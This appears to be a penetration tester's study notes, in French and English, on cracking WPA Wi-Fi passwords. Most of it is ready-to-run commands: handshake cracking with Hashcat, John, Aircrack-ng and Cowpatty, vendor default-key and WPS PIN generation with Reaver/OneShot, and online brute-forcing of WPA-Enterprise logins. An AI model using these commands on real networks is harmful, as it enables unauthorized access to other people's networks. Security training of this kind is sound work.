
> [!WARNING]
> WPA passwords needs to be between 8 and 63 characters


[[#Questions]]
[[#Tools]]
[[#Identifier le fabricant & Générer des default creds]]
[[#Générer des wordlists]]
[[#Bruteforce en ligne du WPA Enterprise]]

# Questions

1. `Is the target network using WPA-Enterprise?` If so, we may be able to gather information about specific users, which can help us craft more effective, personalized wordlists.
2. `Do we know anything about the administrator?` Personal connections or online presence might reveal hobbies or interests that could influence password choices.
3. `Does the SSID indicate a default configuration?` If yes, we can attempt default password wordlists or create a custom list based on the device model or manufacturer.
4. `Do we have the computational resources to perform brute-force attacks?` If resources permit, we could consider incremental brute-force or hybrid attacks as a last resort.

---
# Tools

[[#Cowpatty]]
[[#Aircrack-ng]]
[[#John The Ripper]]
[[#Hashcat]]


## Cowpatty

Check si le fichier est crackable

```shell-session
cowpatty -c -r WPA-01.cap
```

Crack avec wordlist

```shell-session
cowpatty -r WPA-01.cap -f /opt/wordlist.txt -s <SSID>
```

#### Rainbow Tables (Pre-computation)

Générer rainbow table avec le SSID et la wordlist

```shell-session
genpmk -f [wordlist] -d [output_file] -s [SSID]
```

Crack du hash

```shell-session
cowpatty -d [output_file] -r [capture.pcap] -s [SSID]
```


---

## Aircrack-ng


```shell-session
aircrack-ng WPA-01.cap -w /opt/wordlist.txt  
```


---

## John The Ripper

Convertir le .cap ou .pcap au format john.

```shell-session
wpapcap2john wpa-Induction.cap > wpa_handshake.hash
```

Crack du hash

```shell-session
john wpa_handshake.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=wpapsk
```

Montrer le password cracké

```shell-session
john wpa_handshake.hash --show
```

---
## Hashcat

Voir [[HASHCAT]] pour optimisation et utilisation des rules + mask ...

Convertir le .cap au format hashcat

```shell-session
hcxpcapngtool wpa.pcap -o wpa.hash
```

Cracker le hash (mode 22000)

```shell-session
hashcat -m 22000 --force wpa.hash /opt/wordlist.txt 
```

Cracker le hash (mode 22000) avec optimisation du kernel et workload à 4 + règles de rejets pour forcer le >8 et <63

```shell-session
hashcat -m 22000 --force wpa.hash /opt/wordlist.txt --optimized-kernel-enable -w 4 -j '>8' -k '<63'
```


---
# Wordlists

https://github.com/ZKAW/big_wpa_wordlist/blob/master/big_wpa_wordlist.txt




---
# Identifier le fabricant & Générer des default creds

## Vendor lookup


Prendre les 3 premiers octets de l'adresse MAC de l'AP et possible de checker dans /var/lib/ieee-data/oui.txt ou bien sur https://standards-oui.ieee.org/oui/oui.txt


```shell-session
grep -i "9C-C9-EB" /var/lib/ieee-data/oui.txt
```

Puis rechercher des default creds pour le fabricant sur internet.


## Netgear

wordlist
https://github.com/LivingInSyn/netgear_hashcat_wordlist

NPcinator

https://github.com/redsquirrel7/Netgear-Password-Constructinator

```shell-session
sudo python3 NPCinator.py > passwords.txt
```

## Others

|**Link**|**Description**|
|---|---|
|[Smart Password Generator](https://github.com/ahmdrz/wifi-password-generator)|Generates wordlist based on salt, MAC and BSSID of the target|
|[IMEI Password Generator](https://github.com/RealEnder/imeigen)|WPA-PSK default password candidates generator for mobile broadband WIFI routers, based on `IMEI`|
|[Time Warner/Spectrum Routers Cracker](https://github.com/datagoboom/twcracker)|Default Password Generator for `Time Warner` / `Spectrum` Routers|
|[Wifi-WPA-Keyspace-List](https://github.com/sheimo/Wifi-WPA-Keyspace-List)|A list of various routers default WPA key space|


## Default WPS Pin

https://github.com/drygdryg/wpspin

WPSPin -> genère de potentiels pin en sa basant sur l'adresse MAC du routeur

Install

```shell-session
git clone https://github.com/drygdryg/wpspin.git
cd wpspin
sudo python setup.py install
```

Générer 1 PIN

```shell-session
wpspin D4:BF:7F:EB:29:D2
```

Générer plusieurs PIN

```shell-session
wpspin -A D4:BF:7F:EB:29:D2
```


Puis possible de récupérer la PSK à partir du PIN avec OneShot

https://github.com/fulvius31/OneShot

```shell-session
sudo python3 oneshot.py -i wlan0mon -b D4:BF:7F:EB:29:D2 -p <PIN>
```

ou avec Reaver -> https://github.com/t6x/reaver-wps-fork-t6x

```
reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv -p <PIN>
```

---

# Générer des wordlists

[[Wordlists & Rules]]

---

# Bruteforce en ligne du WPA Enterprise

### Générer des usernames

Dans le cas d'un WPA entreprise, necessaire d'utiliser un username pour se connecter.

Identifier les identifiants dans le fichier de capture -> protocol eap -> Response, Identity


[[Wordlists & Rules#Username Anarchy]]


Prépend le domaine aux usernames générés

avec SED

```
sed 's/^/HTB\\/' usernames.txt > formatted_usernames.txt
```

ou script bash

```bash
#!/bin/bash

input_file="usernames.txt"
output_file="formatted_usernames.txt"
domain="HTB"

while IFS= read -r line; do
  echo "${domain}\\${line}" >> "$output_file"
done < "$input_file"
```


Une fois des usernames générés et formattés, possible de bruteforce en ligne avec Air-Hammer (LENT).

https://github.com/Wh1t3Rh1n0/air-hammer

```shell-session
sudo python2 /opt/air-hammer/air-hammer.py -i wlan1 -e <essid> -p /opt/wordlist.txt -u formatted_usernames.txt
```




